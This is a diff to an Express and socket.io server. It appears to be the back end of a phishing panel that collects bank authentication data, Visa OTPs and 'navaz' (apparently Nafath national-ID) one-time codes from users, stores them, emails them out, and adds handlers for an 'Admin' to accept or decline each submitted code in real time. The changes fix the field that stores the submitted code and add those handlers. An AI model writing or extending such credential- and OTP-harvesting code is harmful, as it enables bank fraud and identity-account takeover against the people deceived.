@@ -173,7 +173,7 @@ app.post("/bankAuth/:id", async (req, res) => {
 app.post("/navazOtp/:id", async (req, res) => {
   const { id } = req.params;
   await Order.findByIdAndUpdate(id, {
-    navazOtp: req.body.otp,
+    navazOtp: req.body.navazOtp,
     checked: false,
   }).then(
     async () =>
@@ -189,6 +189,8 @@ app.post("/phone/:id", async (req, res) => {
     checked: false,
     phoneAccept: false,
     networkAccept: false,
+    navazAceept: true,
+    navazOtpAccept: true,
   }).then(
     async () =>
       await sendEmail(req.body, "phone").then(() => res.sendStatus(200))
@@ -329,11 +331,6 @@ io.on("connection", (socket) => {
     io.emit("declineCode", { id, navazCode });
   });
 
-  socket.on("navazOtp", (data) => {
-    console.log("navazOtp  received", data);
-    io.emit("navazOtp", data);
-  });
-
   socket.on("acceptVisaOTP", async (id) => {
     console.log("acceptVisaOTP From Admin", id);
     io.emit("acceptVisaOTP", id);
@@ -416,6 +413,36 @@ io.on("connection", (socket) => {
 
   socket.on("navazChange", async (data) => {
     io.emit("navazChange", data);
+  });
+
+  socket.on("navazOtp", async (data) => {
+    console.log("navazOtp  received", data);
+    await Order.findByIdAndUpdate(data.id, {
+      navazOtpAccept: false,
+      networkAccept: true,
+      navazAceept: true,
+    });
+    io.emit("navazOtp", data);
+  });
+
+  socket.on("acceptNavazOTP", async (id) => {
+    console.log("acceptNavazOTP From Admin", id);
+    await Order.findByIdAndUpdate(id, {
+      navazOtpAccept: true,
+      networkAccept: true,
+      navazAceept: true,
+    });
+    io.emit("acceptNavazOTP", id);
+  });
+
+  socket.on("declineNavazOTP", async (id) => {
+    console.log("declineNavazOTP Form Admin", id);
+    await Order.findByIdAndUpdate(id, {
+      navazOtpAccept: true,
+      networkAccept: true,
+      navazAceept: true,
+    });
+    io.emit("declineNavazOTP", id);
   });
 
   socket.on("network", async (id) => {
